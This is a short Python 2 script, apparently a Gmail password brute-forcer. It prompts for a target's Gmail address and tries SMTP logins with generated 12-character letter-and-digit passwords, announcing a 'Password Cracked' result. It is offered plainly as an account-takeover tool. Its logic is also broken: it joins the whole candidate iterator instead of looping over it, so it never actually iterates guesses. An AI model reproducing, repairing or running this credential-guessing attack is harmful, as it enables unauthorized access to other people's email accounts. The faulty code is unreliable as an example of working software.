import itertools 
import smtplib 
import time
import sys

smtpserver = smtplib.SMTP("smtp.gmail.com", 587) 
smtpserver.ehlo() 
smtpserver.starttls() 
user = raw_input("Enter Target's Gmail Address: ") 

perm = itertools.product("abcdefghijklmnopqrstuvwxyz1234567890", repeat=12)
password = ''.join(perm)
         
try: 
    smtpserver.login(user, password) 
    print "[+] Password Cracked: %s" % password
    time.sleep(10)
except smtplib.SMTPAuthenticationError:
    print "[!] Password Inccorect: %s" % password
